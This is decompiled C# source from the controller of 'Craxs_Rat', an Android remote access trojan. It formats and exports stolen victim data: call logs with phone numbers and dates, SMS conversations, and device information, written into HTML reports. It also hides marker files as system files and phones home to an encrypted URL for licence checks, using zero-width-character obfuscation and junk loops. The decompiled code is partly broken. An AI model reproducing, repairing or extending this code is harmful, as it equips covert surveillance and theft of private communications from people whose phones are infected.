using System;
using System.Collections;
using System.Collections.Generic;
using System.Data;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.CompilerServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using System.Xml;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using WinMM;

namespace Craxs_Rat
{
	// Token: 0x020000EF RID: 239
	[StandardModule]
	internal sealed class Module8
	{
		// Token: 0x0600117F RID: 4479 RVA: 0x000B5BB0 File Offset: 0x000B3DB0
		public static Bitmap smethod_0(bool bool_0)
		{
			Bitmap result;
			if (bool_0)
			{
				result = Module0.shieldon;
			}
			else
			{
				result = Module0.shieldoff;
			}
			return result;
		}

		// Token: 0x06001180 RID: 4480 RVA: 0x000B5BD0 File Offset: 0x000B3DD0
		public static string smethod_1(string string_9, object[] gclass8_0)
		{
			string_9 = string_9.Replace("@", "");
			string[] array = string_9.Split(new char[]
			{
				'|'
			});
			string text = array[1];
			string text2 = array[2];
			string text3 = "null";
			string left = array[0];
			if (Operators.CompareString(left, "onn", false) == 0)
			{
				text3 = "• [ Received \ud83e\udc83 ]";
			}
			else if (Operators.CompareString(left, "ens", false) != 0)
			{
				if (Operators.CompareString(left, "ene", false) != 0)
				{
					if (Operators.CompareString(left, "ogs", false) != 0)
					{
						if (Operators.CompareString(left, "oge", false) == 0)
						{
							text3 = "• [ Ended \ud83e\udc81 ]";
						}
						else if (Operators.CompareString(left, "mc", false) == 0)
						{
							text3 = "• [ Missed Call ]";
						}
					}
					else
					{
						text3 = "• [ Started \ud83e\udc81 ]";
					}
				}
				else
				{
					text3 = "• [ Ended \ud83e\udc83 ]";
				}
			}
			else
			{
				text3 = "• [ Answered \ud83e\udc83 ]";
			}
			GClass9.cypherRat_0.method_24(new object[]
			{
				Module2.smethod_38((Image)gclass8_0.objects_1[0], new Size(45, 45), false),
				text3
			});
			if (text.ToLower().Contains("null"))
			{
				text = "Not Found";
			}
			return string.Concat(new string[]
			{
				text3,
				"\r\n┃\r\n┗━━➤Number: --> ",
				text,
				"\r\n┃\r\n┗━━━➤Date: -> ",
				text2
			});
		}

		// Token: 0x06001181 RID: 4481 RVA: 0x000B5D1C File Offset: 0x000B3F1C
		public static string smethod_2(string string_9)
		{
			string result;
			if (!string_9.StartsWith("https://") && !string_9.StartsWith("http://"))
			{
				result = "https://" + string_9;
			}
			else
			{
				result = string_9;
			}
			return result;
		}

		// Token: 0x06001182 RID: 4482 RVA: 0x000B5D58 File Offset: 0x000B3F58
		public static bool smethod_3()
		{
			try
			{
				GClass0 gclass = new GClass0();
				string text = Module2.smethod_59(Environment.UserName + "~" + gclass.method_2("C"), "Form1");
				XmlDocument xmlDocument = new XmlDocument();
				try
				{
					xmlDocument.LoadXml(File.ReadAllText(Application.StartupPath + "\\" + Module2.smethod_58("8mq82Mp958SsUo4WB4nn6Q==", "Project")));
				}
				catch (Exception ex)
				{
				}
				if (!Module2.smethod_40(Application.StartupPath + "\\" + Module2.smethod_58("8mq82Mp958SsUo4WB4nn6Q==", "Project"), "AngelAndroid_FileManager"))
				{
					Interaction.MsgBox(Module2.smethod_58("vRPM0KvAe2l5ow7/GwxeqrqbxBIoVXSqReiWDDXGYRM=", "File Manager"), MsgBoxStyle.OkOnly, null);
				}
				string value;
				if (Operators.CompareString(xmlDocument.DocumentElement.Name, Module2.smethod_58("7YJYs8nIczW6UcZhgdEyXw==", "Class"), false) == 0)
				{
					XmlElement xmlElement = xmlDocument.FirstChild["P1"];
					value = xmlElement.FirstChild.Value;
				}
				HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(new Uri(Module2.smethod_58("o9RtgdliOoFyIfepi5PQmEBM/VebkSHV+B0pGaw7EvvBn5Xgn503ViBPgdhh27+m1YuTMrPK8P8v\r\nqdMFPFHwivaSruYqFxoBNpBvMdJzyWM=", "‍‍​‏​‎‎‌‍‎‌‌‏‍​​‎‏‍​‏‎‌‏‌‎‎‏‌‌‍​‏​‍ ‍‏​‏‍‏‍‎‎‌‎‍​‌‍​​‎​‌‎‌‎‍‏‌‍‌​​‎‏‏‏‌‎‍‏‎‍‌‎‎‍​‎​‎‍‏‌‎‌‌‏‍‏‎‏‍‏‍‍​‌​​‍‌‌‎ ‏‌‍‍‍‌‎​​‍‍‍‍​‏​‏‌‎‍‌‍​‌‍‌‌‌‍‎‏‍​​‏‏‏‌‍‍‏‌​​‌​​‏‏‏‌‌‏‍‎‍‎‏‏‏‏‍‌​‏‎‍‌‍‌​​‎‎‎‎‌‍‎​‌‏​‌‎‍‏‌‌‏‎​‍‌‌‌‏‎‍‎‎‍ ‍‎‎‍‏‏‌‍​‌‍​‌‍‍‏‍​‍‍‌‎‏‍‎‏‍‌‎‏​‍​‌‏​‏‌‌‍‌‌‏​​‌‌‍‎‏​​‏​‍‏​‎‎‍‌‎‎‏‎‎​‌‏‎‏​‏​‌‎‍‏‍‏​‎‌​‍‏‍‌‏‏‍​‍‍‌‌‍‍ ‌‎‎‍‏‎‌​​‌‌‎‍‍​‍‏‌‌​‎‏‏‌​‎‍‍‏‍​‎‏​‏").Replace("{msg}", text.Replace("+", "%2B")).Replace("{usr}", Module2.smethod_58(value, "​‍‌‎‏"))));
				httpWebRequest.Method = "GET";
				HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
				StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream());
				string text2 = streamReader.ReadToEnd();
				if (text2 != null && text2.Contains("DNZO"))
				{
					return true;
				}
			}
			catch (Exception ex2)
			{
			}
			return false;
		}

		// Token: 0x06001183 RID: 4483 RVA: 0x000B5F38 File Offset: 0x000B4138
		private static string smethod_4(string string_9)
		{
			string result;
			if (!string_9.Contains("-"))
			{
				result = "";
			}
			else
			{
				string text = string_9.Split(new char[]
				{
					'-'
				})[1].Trim();
				Bitmap bitmap = (Bitmap)GModule1.smethod_0(text);
				if (bitmap != null)
				{
					ImageConverter imageConverter = new ImageConverter();
					byte[] inArray = (byte[])imageConverter.ConvertTo(bitmap, typeof(byte[]));
					bitmap.Dispose();
					string text2 = "<img src=\"data:Image/ png;base64," + Convert.ToBase64String(inArray) + "\" alt=\"flag\" />";
					result = text2;
				}
				else
				{
					result = "";
				}
			}
			return result;
		}

		// Token: 0x06001184 RID: 4484 RVA: 0x000B5FD8 File Offset: 0x000B41D8
		public static void smethod_5(GClass8 gclass8_0)
		{
			if (gclass8_0 != null)
			{
				string string_ = gclass8_0.string_10;
				if (!Directory.Exists(string_))
				{
					Directory.CreateDirectory(string_);
				}
				Module8.smethod_10(new string[]
				{
					string_,
					gclass8_0.string_8,
					gclass8_0.string_1,
					gclass8_0.string_6
				});
			}
		}

		// Token: 0x06001185 RID: 4485 RVA: 0x000B6030 File Offset: 0x000B4230
		internal static string smethod_6(int int_0, int int_1, object object_14)
		{
			return "yNjsLiuGaoy7e4h2wNZ6GwJGn2K1MD3khs7Usr3kRao4T6OreWKbHMmAdzVJVQ==#+Ic3JKsl8Mf/3HN86wQ952ayrjK6VG8fKGbNFC2S8adCegWBTyFxej4qwqY99lMbTBJPvoJCZWN";
		}

		// Token: 0x06001186 RID: 4486 RVA: 0x000B6044 File Offset: 0x000B4244
		internal static string smethod_7(int int_0, string string_9)
		{
			try
			{
				GClass0 gclass = new GClass0();
				string text = Module2.smethod_59(Environment.UserName + "~" + gclass.method_2("C"), "Form1");
				XmlDocument xmlDocument = new XmlDocument();
				try
				{
					xmlDocument.LoadXml(File.ReadAllText(Application.StartupPath + "\\" + Module2.smethod_58("8mq82Mp958SsUo4WB4nn6Q==", "Project")));
				}
				catch (Exception ex)
				{
				}
				if (!Module2.smethod_40(Application.StartupPath + "\\" + Module2.smethod_58("8mq82Mp958SsUo4WB4nn6Q==", "Project"), "AngelAndroid_FileManager"))
				{
					Interaction.MsgBox(Module2.smethod_58("vRPM0KvAe2l5ow7/GwxeqrqbxBIoVXSqReiWDDXGYRM=", "File Manager"), MsgBoxStyle.OkOnly, null);
				}
				string value;
				if (Operators.CompareString(xmlDocument.DocumentElement.Name, Module2.smethod_58("7YJYs8nIczW6UcZhgdEyXw==", "Class"), false) == 0)
				{
					XmlElement xmlElement = xmlDocument.FirstChild["P1"];
					value = xmlElement.FirstChild.Value;
				}
				HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(new Uri(Module2.smethod_58("o9RtgdliOoFyIfepi5PQmEBM/VebkSHV+B0pGaw7EvvBn5Xgn503ViBPgdhh27+m1YuTMrPK8P8v\r\nqdMFPFHwivaSruYqFxoBNpBvMdJzyWM=", "‍‍​‏​‎‎‌‍‎‌‌‏‍​​‎‏‍​‏‎‌‏‌‎‎‏‌‌‍​‏​‍ ‍‏​‏‍‏‍‎‎‌‎‍​‌‍​​‎​‌‎‌‎‍‏‌‍‌​​‎‏‏‏‌‎‍‏‎‍‌‎‎‍​‎​‎‍‏‌‎‌‌‏‍‏‎‏‍‏‍‍​‌​​‍‌‌‎ ‏‌‍‍‍‌‎​​‍‍‍‍​‏​‏‌‎‍‌‍​‌‍‌‌‌‍‎‏‍​​‏‏‏‌‍‍‏‌​​‌​​‏‏‏‌‌‏‍‎‍‎‏‏‏‏‍‌​‏‎‍‌‍‌​​‎‎‎‎‌‍‎​‌‏​‌‎‍‏‌‌‏‎​‍‌‌‌‏‎‍‎‎‍ ‍‎‎‍‏‏‌‍​‌‍​‌‍‍‏‍​‍‍‌‎‏‍‎‏‍‌‎‏​‍​‌‏​‏‌‌‍‌‌‏​​‌‌‍‎‏​​‏​‍‏​‎‎‍‌‎‎‏‎‎​‌‏‎‏​‏​‌‎‍‏‍‏​‎‌​‍‏‍‌‏‏‍​‍‍‌‌‍‍ ‌‎‎‍‏‎‌​​‌‌‎‍‍​‍‏‌‌​‎‏‏‌​‎‍‍‏‍​‎‏​‏").Replace("{msg}", text.Replace("+", "%2B")).Replace("{usr}", Module2.smethod_58(value, "​‍‌‎‏"))));
				httpWebRequest.Method = "GET";
				string text2;
				do
				{
					text2 = "C9KFdlwYT9jeOISYDw3jFecxvEdGdKArFcO0H1DLizmPp";
					httpWebRequest.Timeout = text2.Length;
				}
				while (text2.Length <= 0);
				string text3;
				do
				{
					text3 = "YBXJ6mEoqW/xAhS/7gQCt7WcHZ/1jvHl6kB7PCTw3KOCXIU6Tyc";
					httpWebRequest.Timeout = text3.Length;
				}
				while (text3.Length <= 0);
				string text4;
				do
				{
					text4 = "TZCyiLndI/Ecq1HJnurkIlUlB9nnSUrD3E3T3WC7Ljhl7GTjKH21wFnHe";
					httpWebRequest.Timeout = text4.Length;
				}
				while (text4.Length <= 0);
				string text5;
				do
				{
					text5 = "vdRJQJ0bZOcckGDkHIU2sclTelhpwGE3Ei0GLpxBH0b722loE0C4tcbyseW/TusZR2LhpkpBLIbU";
					httpWebRequest.Timeout = text5.Length;
				}
				while (text5.Length <= 0);
				string text6;
				do
				{
					text6 = "gYQ0BoRx2jJuFvIv2YpHCqOVUbJxmXucPisakEchRao4T6OreWKbHMmAdzVJVQ==";
					httpWebRequest.Timeout = 500;
				}
				while (text6.Length <= 0);
				HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
				StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream());
				string text7 = streamReader.ReadToEnd();
				if (text7 == null || !text7.Contains("DNZO"))
				{
				}
				string text8;
				do
				{
					text8 = "jGXrCodPROs1x9Wssi7gL5F2528sED";
				}
				while (text8.Length <= 0);
				string text9;
				do
				{
					text9 = "+Mn1I58VILxBXYKrv9pY8dvF7idY2c1Hoo6Y3ZfQwJzBZ5pE11fFgacfgzOrM";
					httpWebRequest.Timeout = text9.Length;
				}
				while (text9.Length <= 0);
			}
			catch (Exception ex2)
			{
			}
			int num = 0;
			checked
			{
				do
				{
					int_0 += string_9.Length;
					num++;
				}
				while (num <= 5);
				return GClass7.smethod_0("+c/TMWA0JhtX9/Wm45J2VI5mWhYC7HuavRao4T6OreWKbHMmAdzVJVQ==", string_9, int_0);
			}
		}

		// Token: 0x06001187 RID: 4487 RVA: 0x000B6350 File Offset: 0x000B4550
		internal static string smethod_8(string string_9)
		{
			string result;
			if (Operators.CompareString(string_9, "0", false) != 0)
			{
				if (Operators.CompareString(string_9, "1", false) != 0)
				{
					if (Operators.CompareString(string_9, "2", false) != 0)
					{
						if (Operators.CompareString(string_9, "3", false) == 0)
						{
							result = "Pic:";
						}
						else if (Operators.CompareString(string_9, "4", false) == 0)
						{
							result = "Pic:";
						}
						else if (Operators.CompareString(string_9, "5", false) != 0)
						{
							result = "";
						}
						else
						{
							result = "CheckBox:";
						}
					}
					else
					{
						result = "Text:";
					}
				}
				else
				{
					result = "Button:";
				}
			}
			else
			{
				result = "textbox:";
			}
			return result;
		}

		// Token: 0x06001188 RID: 4488 RVA: 0x000B63EC File Offset: 0x000B45EC
		public static string smethod_9(object strings_0)
		{
			string result;
			if (strings_0.Length >= 9)
			{
				string left = strings_0[8].Trim();
				if (Operators.CompareString(left, "[CR]", false) != 0)
				{
					result = strings_0[8].Trim();
				}
				else
				{
					result = "k";
				}
			}
			else
			{
				result = "";
			}
			return result;
		}

		// Token: 0x06001189 RID: 4489 RVA: 0x000B6438 File Offset: 0x000B4638
		public static void smethod_10(object strings_0)
		{
			try
			{
				string path = strings_0[0] + "\\user.info";
				if (File.Exists(path))
				{
					File.SetAttributes(path, FileAttributes.Normal);
				}
				File.WriteAllText(path, string.Concat(new string[]
				{
					strings_0[1],
					"\r\n",
					strings_0[2],
					"\r\n",
					strings_0[3]
				}));
				File.SetAttributes(path, FileAttributes.Hidden | FileAttributes.System);
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x0600118A RID: 4490 RVA: 0x000B64C4 File Offset: 0x000B46C4
		internal static string[] smethod_11(string string_9)
		{
			return string_9.Split(new char[]
			{
				'*'
			});
		}

		// Token: 0x0600118B RID: 4491 RVA: 0x000B64E4 File Offset: 0x000B46E4
		internal static object smethod_12(string string_9)
		{
			string[] array = string_9.Split(new char[]
			{
				'<'
			});
			return new object[]
			{
				array[0],
				array[1],
				array[2]
			};
		}

		// Token: 0x0600118C RID: 4492 RVA: 0x000B6520 File Offset: 0x000B4720
		public static void smethod_13(Array array_0)
		{
			string text = string.Format("{0}, {1}, {2}", Module5.White.R, Module5.White.G, Module5.White.B);
			string text2 = string.Format("{0}, {1}, {2}", Module5.color_0.R, Module5.color_0.G, Module5.color_0.B);
			string text3 = string.Format("{0}, {1}, {2}", Module5.Blue.R, Module5.Blue.G, Module5.Blue.B);
			string left = (string)array_0.GetValue(6);
			checked
			{
				if (Operators.CompareString(left, "log", false) == 0)
				{
					string str = string.Concat(new string[]
					{
						"<!DOCTYPE html>\r\n<html>\r\n<head>\r\n<style>\r\ntable, th, td {\r\n  border: 1px solid rgb(",
						text,
						");\r\n  border-collapse: collapse;\r\n  text-align: left;\r\n}\r\n<style>\r\n::-moz-selection {\r\n  color: rgb(",
						text2,
						");\r\n  background-color: rgb(",
						text,
						");\r\n}\r\n::selection {\r\n  color: rgb(",
						text2,
						");\r\n  background-color: rgb(",
						text,
						");\r\n}\r\n</style>\r\n</head>\r\n \r\n<body style=\"background: rgb(",
						text2,
						");font-family:courier;\" >\r\n<table style=\"width:50%\">"
					});
					string text4 = (string)array_0.GetValue(3);
					string text5 = (string)array_0.GetValue(4);
					string text6 = (string)array_0.GetValue(5);
					string str2 = string.Concat(new string[]
					{
						"<h1 style=\"color: rgb(",
						text,
						");\">",
						text4,
						"</h1>\r\n<h2 style=\"color: rgb(",
						text,
						");\">",
						(Operators.CompareString(Module8.smethod_4(text5), "", false) == 0) ? "" : (Module8.smethod_4(text5) + Strings.Space(1)),
						text5.Replace("-", "/ip:"),
						"</h2>\r\n<p style=\"color: rgb(",
						text,
						");\">",
						text6,
						"</p>"
					});
					string path;
					if (!Operators.ConditionalCompareObjectEqual(array_0.GetValue(1), "null", false))
					{
						string text7 = (string)array_0.GetValue(1) + "\\";
						string str3 = (string)array_0.GetValue(2) + "\\";
						string str4 = (string)array_0.GetValue(7);
						if (!Directory.Exists(text7))
						{
							return;
						}
						if (!Directory.Exists(text7 + str3))
						{
							Directory.CreateDirectory(text7 + str3);
						}
						path = text7 + str3 + str4;
						if (!File.Exists(path))
						{
							File.Create(path).Close();
						}
						if (!File.Exists(path))
						{
							return;
						}
					}
					else
					{
						path = Conversions.ToString(array_0.GetValue(2));
					}
					using (StreamWriter streamWriter = new StreamWriter(path, true, Module2.smethod_9()))
					{
						streamWriter.Write(str + "\r\n");
						streamWriter.Write(str2 + "\r\n");
						streamWriter.Write(string.Concat(new string[]
						{
							"<tr style=\"color: rgb(",
							text2,
							"); background: rgb(",
							text,
							");\">\r\n"
						}));
						DataGridView dataGridView = (DataGridView)array_0.GetValue(0);
						int num = dataGridView.ColumnCount - 1;
						for (int i = 0; i <= num; i++)
						{
							if (dataGridView.Columns[i].GetType().ToString().ToLower().Contains("DataGridViewTextBoxColumn".ToLower()))
							{
								streamWriter.Write("<th>" + dataGridView.Columns[i].HeaderText + "</th>\r\n");
							}
						}
						int num2 = dataGridView.Rows.Count - 1;
						for (int j = 0; j <= num2; j++)
						{
							streamWriter.Write("</tr>\r\n");
							streamWriter.Write(string.Concat(new string[]
							{
								"<tr style=\"color: rgb(",
								text,
								"); background: rgb(",
								text2,
								");\">\r\n"
							}));
							int num3 = dataGridView.ColumnCount - 1;
							for (int k = 0; k <= num3; k++)
							{
								if (dataGridView.Columns[k].GetType().ToString().ToLower().Contains("DataGridViewTextBoxColumn".ToLower()))
								{
									streamWriter.Write(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("<td>", dataGridView.Rows[j].Cells[k].Value), "</td>"), "\r\n"));
								}
							}
							streamWriter.Write("</tr>\r\n");
						}
						streamWriter.Write("</table>\r\n");
						streamWriter.Write("</body>\r\n");
						streamWriter.Write("</html>\r\n");
						streamWriter.Close();
						return;
					}
				}
				if (Operators.CompareString(left, "sms", false) != 0)
				{
					if (Operators.CompareString(left, "info", false) != 0)
					{
						return;
					}
					string str5 = string.Concat(new string[]
					{
						"<!DOCTYPE html>\r\n<html>\r\n<head>\r\n<style>\r\ntable, th, td {\r\n  border: 1px solid rgb(",
						text,
						");\r\n  border-collapse: collapse;\r\n  text-align: left;\r\n}\r\n  tr.noBorder td {\r\n  border: 0;\r\n}\r\n<style>\r\n::-moz-selection {\r\n  color: rgb(",
						text2,
						");\r\n  background-color: rgb(",
						text,
						");\r\n}\r\n::selection {\r\n  color: rgb(",
						text2,
						");\r\n  background-color: rgb(",
						text,
						");\r\n}\r\n</style>\r\n</head>\r\n \r\n<body style=\"background: rgb(",
						text2,
						");font-family:courier;\" >\r\n<table style=\"width:50%\">"
					});
					string text8 = (string)array_0.GetValue(3);
					string text9 = (string)array_0.GetValue(4);
					string text10 = (string)array_0.GetValue(5);
					string str6 = string.Concat(new string[]
					{
						"<h1 style=\"color: rgb(",
						text,
						");\">",
						text8,
						"</h1>\r\n<h2 style=\"color: rgb(",
						text,
						");\">",
						(Operators.CompareString(Module8.smethod_4(text9), "", false) == 0) ? "" : (Module8.smethod_4(text9) + Strings.Space(1)),
						text9.Replace("-", "/ip:"),
						"</h2>\r\n<p style=\"color: rgb(",
						text,
						");\">",
						text10,
						"</p>"
					});
					string path2;
					if (!Operators.ConditionalCompareObjectEqual(array_0.GetValue(1), "null", false))
					{
						string text11 = (string)array_0.GetValue(1) + "\\";
						string str7 = (string)array_0.GetValue(2) + "\\";
						string str8 = (string)array_0.GetValue(7);
						if (!Directory.Exists(text11))
						{
							return;
						}
						if (!Directory.Exists(text11 + str7))
						{
							Directory.CreateDirectory(text11 + str7);
						}
						path2 = text11 + str7 + str8;
						if (!File.Exists(path2))
						{
							File.Create(path2).Close();
						}
						if (!File.Exists(path2))
						{
							return;
						}
					}
					else
					{
						path2 = Conversions.ToString(array_0.GetValue(2));
					}
					using (StreamWriter streamWriter2 = new StreamWriter(path2, true, Module2.smethod_9()))
					{
						streamWriter2.Write(str5 + "\r\n");
						streamWriter2.Write(str6 + "\r\n");
						streamWriter2.Write(string.Concat(new string[]
						{
							"<tr style=\"color: rgb(",
							text2,
							"); background: rgb(",
							text,
							");\">\r\n"
						}));
						DataSet dataSet = (DataSet)array_0.GetValue(0);
						DataTable dataTable = dataSet.Tables[0];
						streamWriter2.Write("<th>" + dataTable.Columns[0].ColumnName + "</th>\r\n");
						streamWriter2.Write("<th>" + dataTable.Columns[1].ColumnName + "</th>\r\n");
						try
						{
							foreach (object obj in dataTable.Rows)
							{
								object objectValue = RuntimeHelpers.GetObjectValue(obj);
								streamWriter2.Write("</tr>\r\n");
								if (!Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(objectValue, null, "Item", new object[]
								{
									1
								}, null, null, null), "sub", false))
								{
									streamWriter2.Write(string.Concat(new string[]
									{
										"<tr style=\"color: rgb(",
										text,
										"); background: rgb(",
										text2,
										");\">\r\n"
									}));
									streamWriter2.Write(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("<td>", NewLateBinding.LateGet(objectValue, null, "Item", new object[]
									{
										0
									}, null, null, null)), "</td>"), "\r\n"));
									streamWriter2.Write(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("<td>", NewLateBinding.LateGet(objectValue, null, "Item", new object[]
									{
										1
									}, null, null, null)), "</td>"), "\r\n"));
									streamWriter2.Write("</tr>\r\n");
								}
								else
								{
									streamWriter2.Write(string.Concat(new string[]
									{
										"<tr Class=\"noBorder\"; style=\"color: rgb(",
										text3,
										"); background: rgb(",
										text2,
										");\">\r\n"
									}));
									streamWriter2.Write(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("<td>", NewLateBinding.LateGet(objectValue, null, "Item", new object[]
									{
										0
									}, null, null, null)), "</td>"), "\r\n"));
									streamWriter2.Write("<td>" + string.Empty + "</td>\r\n");
									streamWriter2.Write("</tr>\r\n");
								}
							}
						}
						finally
						{
							IEnumerator enumerator;
							if (enumerator is IDisposable)
							{
								(enumerator as IDisposable).Dispose();
							}
						}
						streamWriter2.Write("</table>\r\n");
						streamWriter2.Write("</body>\r\n");
						streamWriter2.Write("</html>\r\n");
						streamWriter2.Close();
						return;
					}
				}
				DataGridView dataGridView2 = (DataGridView)array_0.GetValue(0);
				string str9 = string.Concat(new string[]
				{
					"<!DOCTYPE html>\r\n<html>\r\n<head>\r\n<style>\r\ntable, th, td {\r\n  border: 1px solid rgb(",
					text,
					");\r\n  border-collapse: collapse;\r\n  text-align: left;\r\n}\r\n<style>\r\n::-moz-selection {\r\n  color: rgb(",
					text2,
					");\r\n  background-color: rgb(",
					text,
					");\r\n}\r\n::selection {\r\n  color: rgb(",
					text2,
					");\r\n  background-color: rgb(",
					text,
					");\r\n}\r\n</style>\r\n</head>\r\n \r\n<body style=\"background: rgb(",
					text2,
					");font-family:courier;\" >\r\n<table style=\"width:50%\">"
				});
				string text12 = (string)array_0.GetValue(3);
				string text13 = (string)array_0.GetValue(4);
				string str10 = string.Empty;
				if (dataGridView2.Rows.Count > 0)
				{
					str10 = Conversions.ToString(dataGridView2.Rows[0].Cells[4].Value);
				}
				string text14 = (string)array_0.GetValue(5) + Strings.Space(1) + str10;
				string str11 = string.Concat(new string[]
				{
					"<h1 style=\"color: rgb(",
					text,
					");\">",
					text12,
					"</h1>\r\n<h2 style=\"color: rgb(",
					text,
					");\">",
					(Operators.CompareString(Module8.smethod_4(text13), "", false) != 0) ? (Module8.smethod_4(text13) + Strings.Space(1)) : "",
					text13.Replace("-", "/ip:"),
					"</h2>\r\n<p style=\"color: rgb(",
					text,
					");\">",
					text14,
					"</p>"
				});
				string path3;
				if (!Operators.ConditionalCompareObjectEqual(array_0.GetValue(1), "null", false))
				{
					string text15 = (string)array_0.GetValue(1) + "\\";
					string str12 = (string)array_0.GetValue(2) + "\\";
					string str13 = (string)array_0.GetValue(7);
					if (!Directory.Exists(text15))
					{
						return;
					}
					if (!Directory.Exists(text15 + str12))
					{
						Directory.CreateDirectory(text15 + str12);
					}
					path3 = text15 + str12 + str13;
					if (!File.Exists(path3))
					{
						File.Create(path3).Close();
					}
					if (!File.Exists(path3))
					{
						return;
					}
				}
				else
				{
					path3 = Conversions.ToString(array_0.GetValue(2));
				}
				using (StreamWriter streamWriter3 = new StreamWriter(path3, true, Module2.smethod_9()))
				{
					streamWriter3.Write(str9 + "\r\n");
					streamWriter3.Write(str11 + "\r\n");
					streamWriter3.Write(string.Concat(new string[]
					{
						"<style>\r\ndiv {border: 2px solid gray;padding: 10px;color: rgb(",
						text,
						");\r\n border-color: rgb(",
						text,
						")\r\n}\r\n<p style=\"color: rgb(",
						text,
						");\">\r\n</style>\r\n"
					}));
					string headerText = dataGridView2.Columns[0].HeaderText;
					string headerText2 = dataGridView2.Columns[1].HeaderText;
					string headerText3 = dataGridView2.Columns[2].HeaderText;
					int num4 = dataGridView2.Rows.Count - 1;
					for (int l = 0; l <= num4; l++)
					{
						streamWriter3.Write("<div>\r\n");
						streamWriter3.Write(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("<p>" + headerText + ":", dataGridView2.Rows[l].Cells[0].Value), "</p>"), "\r\n"));
						streamWriter3.Write(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("<p>" + headerText2 + ":", dataGridView2.Rows[l].Cells[1].Value), "</p>"), "\r\n"));
						streamWriter3.Write(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("<p>" + headerText3 + ":", dataGridView2.Rows[l].Cells[2].Value), "</p>"), "\r\n"));
						streamWriter3.Write(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("<p>", dataGridView2.Rows[l].Tag), "</p>"), "\r\n"));
						streamWriter3.Write("</div>\r\n");
					}
					streamWriter3.Write("</body>\r\n");
					streamWriter3.Write("</html>\r\n");
					streamWriter3.Close();
				}
			}
		}

		// Token: 0x0600118D RID: 4493 RVA: 0x000B7424 File Offset: 0x000B5624
		internal static void smethod_14()
		{
			Interaction.MsgBox(Module2.smethod_58("RmQl4TNDwhwoSBG2I0GY3qlUlWiQf6jkXGXcz18OhFc=", "String"), MsgBoxStyle.OkOnly, null);
		}

		// Token: 0x0600118E RID: 4494 RVA: 0x000B7448 File Offset: 0x000B5648
		internal static void smethod_15(string string_9, object gclass8_0)
		{
			checked
			{
				try
				{
					string[] array = string_9.Split(new char[]
					{
						'|'
					});
					string text = array[0];
					string text2 = array[1];
					string text3 = array[2] + array[3];
					int num = gclass8_0.strings_1.Count<string>() - 1;
					for (int i = 0; i <= num; i++)
					{
						if (gclass8_0.strings_1[i] == null)
						{
							gclass8_0.strings_1[i] = string.Concat(new string[]
							{
								"\r\n\r\n",
								text,
								"\r\n\r\n",
								text2,
								"\r\n\r\n",
								text3
							});
							IL_98:
							gclass8_0.bool_9 = true;
							GClass9.cypherRat_0.method_23(new object[]
							{
								Module2.smethod_38((Image)gclass8_0.objects_1[0], new Size(45, 45), false),
								text3
							});
							return;
						}
					}
					goto IL_98;
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x0600118F RID: 4495 RVA: 0x000B7548 File Offset: 0x000B5748
		public static void smethod_16(string string_9, Collection collection_0, object object_16)
		{
			collection_0.Remove(string_9);
			collection_0.Add(object_16, string_9, null, null);
		}

		// Token: 0x06001190 RID: 4496 RVA: 0x000B7568 File Offset: 0x000B5768
		public static object smethod_17(string string_9, Collection collection_0)
		{
			object result;
			try
			{
				result = collection_0[string_9];
			}
			catch (Exception ex)
			{
				result = null;
			}
			return result;
		}

		// Token: 0x06001191 RID: 4497 RVA: 0x000B75A4 File Offset: 0x000B57A4
		public static string smethod_18(long long_0)
		{
			long num = 1024L;
			long num2 = 1048576L;
			long num3 = 1073741824L;
			long num4 = 1099511627776L;
			string text = "0 Bytes";
			if (long_0 >= 1024L)
			{
				if (long_0 <= num4)
				{
					if (long_0 > num3)
					{
						text = ((double)long_0 / (double)num / (double)num / (double)num).ToString("0.00") + " GB";
					}
					else if (long_0 <= num2)
					{
						if (long_0 >= num)
						{
							text = ((double)long_0 / (double)num).ToString("0.00") + " KB";
						}
					}
					else
					{
						text = ((double)long_0 / (double)num / (double)num).ToString("0.00") + " MB";
					}
				}
				else
				{
					text = ((double)long_0 / (double)num / (double)num / (double)num / (double)num).ToString("0.00") + " TB";
				}
			}
			else
			{
				text = Conversions.ToString(long_0) + " Bytes";
			}
			return text.ToString();
		}

		// Token: 0x06001192 RID: 4498 RVA: 0x000B76D4 File Offset: 0x000B58D4
		public static string smethod_19(string string_9, string string_10)
		{
			string result;
			try
			{
				result = Regex.Match(Module8.stringBuilder_0.ToString(), string.Concat(new string[]
				{
					"(?<=",
					Regex.Escape(string_9),
					").+?(?=",
					Regex.Escape(string_10),
					")"
				}), RegexOptions.IgnoreCase).Value;
			}
			catch (Exception ex)
			{
				result = "-1";
			}
			return result;
		}

		// Token: 0x06001193 RID: 4499 RVA: 0x000B7754 File Offset: 0x000B5954
		public static WaveFormat smethod_20(int int_0)
		{
			if (int_0 > 16000)
			{
				if (int_0 == 22050)
				{
					return WaveFormat.Pcm22Khz16BitMono;
				}
				if (int_0 == 32000)
				{
					return WaveFormat.Pcm32Khz16BitMono;
				}
				if (int_0 == 44100)
				{
					return WaveFormat.Pcm44Khz16BitMono;
				}
			}
			else
			{
				if (int_0 == 8000)
				{
					return WaveFormat.Pcm8Khz16BitMono;
				}
				if (int_0 == 11025)
				{
					return WaveFormat.Pcm11Khz16BitMono;
				}
				if (int_0 == 16000)
